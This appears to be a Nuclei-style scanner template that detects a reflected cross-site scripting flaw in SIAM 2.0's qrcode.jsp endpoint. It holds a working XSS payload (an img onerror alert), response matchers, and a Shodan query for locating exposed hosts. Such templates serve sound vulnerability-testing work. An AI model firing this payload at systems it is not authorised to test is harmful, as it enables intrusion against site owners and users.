id: siam-xss

info:
  name: SIAM 2.0 - 跨站脚本漏洞
  author: 3th1c_yuk1
  severity: medium
  description: SIAM 2.0 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://vuldb.com/?submit.496171
    - https://ftp.ogma.in/blog/understanding-and-mitigating-cve-2025-1359-siam-2-0-vulnerabilities
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"siam-convite"
  tags: siam,convite,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/siam-convite/qrcode.jsp?url=1%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<img src=x onerror=alert(document.domain)>'
          - 'SIAM</a>'
        condition: and

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: status
        status:
          - 200
